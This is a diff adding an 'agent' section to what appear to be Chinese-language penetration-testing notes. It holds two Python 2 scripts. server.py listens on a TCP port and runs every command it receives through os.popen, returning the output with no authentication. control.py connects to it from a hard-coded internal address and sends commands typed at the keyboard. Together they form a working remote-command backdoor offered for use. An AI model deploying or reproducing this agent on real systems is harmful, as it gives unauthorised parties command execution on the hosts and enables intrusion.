@@ -83,6 +83,86 @@ done
 
 将上面的程序保存为socks_proxy.sh,每次要运行就直接sh socks_porxy.sh &,也可以写到服务里面。
 
+### 7.agent
+
+### control.py
+
+```python
+#!/usr/bin/env python
+#coding: utf-8
+from socket import *
+from time import ctime
+import select
+import sys
+HOST='172.16.199.150'
+PORT=21569
+BUFSIZ=1024
+ADDR=(HOST,PORT)  #服务器的地址与端口
+
+tcpCliSock=socket(AF_INET,SOCK_STREAM) #生成客户端的套接字，并连上服务器
+tcpCliSock.connect(ADDR)
+input1=[tcpCliSock,sys.stdin]
+
+while True:
+    readyInput,readyOutput,readyException=select.select(input1,[],[])
+    for indata in readyInput:
+        if indata==tcpCliSock:
+            data=tcpCliSock.recv(BUFSIZ)
+            if not data:
+                break
+            print data
+        else:
+            data=raw_input()
+            if not data:
+                break
+            tcpCliSock.send(data) #发送命令
+
+tcpCliSock.close()
+```
+
+### server.py
+
+```python
+#!/usr/bin/env python
+#coding: utf-8
+
+from socket import *
+from time import ctime
+import select
+import sys
+import os
+
+HOST=''
+PORT=21569
+BUFSIZ=1024
+ADDR=(HOST,PORT)
+
+tcpSerSock=socket(AF_INET,SOCK_STREAM)
+tcpSerSock.bind(ADDR)
+tcpSerSock.listen(5)
+input=[tcpSerSock,sys.stdin]
+
+while True:
+    print 'waiting for connection...'
+    tcpCliSock,addr=tcpSerSock.accept()
+    print '...connected from:',addr
+    input.append(tcpCliSock) #可以有多个控制端同时连接
+
+    while True:
+        readyInput,readyOutput,readyException=select.select(input,[],[]) #每次循环都会阻塞在这里，只有当有数据输入时才会执行下面的操作
+        for indata in readyInput:
+            if indata==tcpCliSock:
+                data=tcpCliSock.recv(BUFSIZ)
+                if not data:
+                    break
+                tcpCliSock.send(os.popen(data).read())
+
+tcpCliSock.close()
+
+```
+运行结果如下：
+
+![agent](image/agent_result.png)
 
 
 
